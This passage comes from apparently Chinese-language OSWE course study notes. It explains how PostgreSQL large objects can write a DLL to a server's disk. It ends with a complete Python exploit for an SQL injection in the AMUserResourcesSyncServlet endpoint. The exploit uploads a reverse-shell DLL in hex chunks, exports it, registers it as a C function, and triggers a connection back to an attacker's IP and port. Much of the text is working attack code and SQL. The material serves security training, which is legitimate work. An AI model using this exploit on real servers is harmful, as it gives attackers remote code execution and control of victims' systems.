       print "[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0]
       sys.exit()
       
   sqli_url  = "https://"+server+"/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;%s;--" 
   create_udf_func(sqli_url)
   trigger_udf(sqli_url, attacker, port)
```
執行 exploit
```
python exploit.py <serverIP:port> <attackerIP> <port>
```

### More Shells!!!    
上述用利用 SMB share 載入 DLL，但如果目標主機無法連到外部 share 就無法達成\
但因為 COPY TO 無法安全寫 binary file

>[!Note]
> 為什麼 COPY TO 無法寫入 DLL？\
> DLL 是 PE binary 包含 `00`, `FF`, `NULL`, `binary headers`\
> 但 COPY TO 會 做 encoding、可能轉 newline、escape characters、string termination 等等
>> 例如 `0x00` (PostgreSQL documentation 說明 The character with code zero cannot be in a string constant.)

🥚 可以嘗試利用 PostgreSQL Large Object (LO) 機制來寫入 DLL\
(用於儲存大型 binary: image, video, PDF)

1. 建立 large object 用於存放 binary payload（ DLL file）
2. 將  large object EXPLOT 到 remote server file system
3. 建立 UDF 並使用匯出的 DLL 作為來源檔案
4. 觸發 UDF 並執行任意程式碼

確認 lo_import():
```sql
amdb=# select lo_import('C:\\Windows\\win.ini');
 lo_import
-----------
    194206
(1 row)

amdb=# \lo_list
          Large objects
   ID   |  Owner   | Description
--------+----------+-------------
 194206 | postgres |
(1 row)
```
> 將 win.ini 匯入資料庫，傳回值是 loid of the large object 

>[!Tip]
> 在 large object 中，若是在嘗試 blind SQL injection 環境無法看到 `loid = 194206`，會導致不知道要 export 哪個 loid

PostgreSQL 支援指定 loid: `SELECT lo_import('file', LOID);`
```sql
amdb=# select lo_import('C:\\Windows\\win.ini', 1337);
 lo_import
-----------
      1337
(1 row)
```

Large object 存在 `pg_largeobject`
```sql
amdb=# select loid, pageno from pg_largeobject;
 loid | pageno
------+--------
 1337 |      0
(1 row)
```
> pageno : 當 large objects 匯入 PostgreSQL 資料庫時，會被分割成 2KB 的資料區塊，然後分別儲存在 pg_largeobject table 中\
> ![image](https://hackmd.io/_uploads/ByODYbotbe.png)


#### 1. 查看 large object 內容:
```sql
amdb=# select loid, pageno, encode(data, 'escape') from pg_largeobject;
 loid | pageno |           encode
------+--------+----------------------------
 1337 |      0 | ; for 16-bit app support\r+
      |        | [fonts]\r                 +
      |        | [extensions]\r            +
      |        | [mci extensions]\r        +
      |        | [files]\r                 +
      |        | [Mail]\r                  +
      |        | MAPI=1\r                  +
      |        |
(1 row)
```

#### 2. 直接修改 large object: (把 Hex 轉成 Binary)
```sql
amdb=# update pg_largeobject set data=decode('77303074', 'hex') where loid=1337 and pageno=0;
UPDATE 1
amdb=# select loid, pageno, encode(data, 'escape') from pg_largeobject;
 loid | pageno | encode
------+--------+--------
 1337 |      0 | w00t
(1 row)
```
#### 3. Export large object
把 large object 1337 寫到檔案 `C:\new_win.ini`
```sql
amdb=# select lo_export(1337, 'C:\\new_win.ini');
 lo_export
-----------
         1
(1 row)
```
![image](https://hackmd.io/_uploads/Bkow5biYZl.png)

```
建立 LO lo_import()    
      │
      ▼
取得固定 LOID (1337)
      │
      ▼
SQL injection 修改 pg_largeobject.data
      │
      ▼
export LO lo_export() 寫成 DLL
      │
      ▼
   建立 UDF
      │
      ▼
   執行 UDF
```

LO 的清理: `\lo_list`\
刪除指定: `SELECT lo_unlink(1337);`, `\lo_unlink 1337`

### Large Object Reverse Shell
```py
import requests, sys, urllib, string, random, time
requests.packages.urllib3.disable_warnings()

# 這裡的 DLL 內容必須先轉換為 Hex 字串 (例如: "4d5a90...")
udf = 'YOUR_DLL_HEX_STRING_HERE'
loid = 1337

def log(msg):
   print msg

def make_request(url, sql):
   encoded_sql = urllib.quote(sql)
   log("[*] Executing query: %s" % sql[0:80])
   r = requests.get(url % encoded_sql, verify=False)
   return r

def delete_lo(url, loid):
   log("[+] Deleting existing LO...")
   sql = "SELECT lo_unlink(%d)" % loid
   make_request(url, sql)

def create_lo(url, loid):
   log("[+] Creating LO for UDF injection...")
   sql = "SELECT lo_import($$C:\\windows\\win.ini$$,%d)" % loid
   make_request(url, sql)
   
def inject_udf(url, loid):
   log("[+] Injecting payload of length %d into LO..." % len(udf))
   # 2048 bytes * 2 (for hex encoding) = 4096 characters per chunk
   chunk_size = 4096
   for i in range(0, ((len(udf)-1) / chunk_size) + 1):
         udf_chunk = udf[i * chunk_size : (i+1) * chunk_size]
         if i == 0:
             sql = "UPDATE PG_LARGEOBJECT SET data=decode($$%s$$, $$hex$$) where loid=%d and pageno=%d" % (udf_chunk, loid, i)
         else:
             sql = "INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES (%d, %d, decode($$%s$$, $$hex$$))" % (loid, i, udf_chunk)
         make_request(url, sql)

def export_udf(url, loid):
   log("[+] Exporting UDF library to filesystem...")
   sql = "SELECT lo_export(%d, $$C:\\Users\\Public\\rev_shell.dll$$)" % loid
   make_request(url, sql)
   
def create_udf_func(url):
   log("[+] Creating function...")
   # connect_back 是 DLL 內部的導出函數名稱
   sql = "create or replace function rev_shell(text, integer) returns VOID as $$C:\\Users\\Public\\rev_shell.dll$$, $$connect_back$$ language C strict"
   make_request(url, sql)

def trigger_udf(url, ip, port):
   log("[+] Launching reverse shell...")
   sql = "select rev_shell($$%s$$, %d)" % (ip, int(port))
   make_request(url, sql)
   
if __name__ == '__main__':
   try:
       server = sys.argv[1].strip()
       attacker = sys.argv[2].strip()
       port = sys.argv[3].strip()
   except IndexError:
       print "[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0]
       sys.exit()
       
   sqli_url  = "https://"+server+"/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;%s;--" 
   
   delete_lo(sqli_url, loid)   
   create_lo(sqli_url, loid)
   inject_udf(sqli_url, loid)
   export_udf(sqli_url, loid)
   create_udf_func(sqli_url)
   trigger_udf(sqli_url, attacker, port)
```

# DotNetNuke Cookie Deserialization RCE

>[!Caution]
> HackMD 筆記長度限制，接續 [[OSWE, WEB-300] Instructional notes - Part 2](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-2/)
 
# [Link to: "[OSWE, WEB-300] Instructional notes - Part 2"](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-2/)

# [Link to: "[OSWE, WEB-300] Instructional notes - Part 3"](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-3/)

# [Link to: "[OSWE, WEB-300] Instructional notes - Part 4"](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-4/)


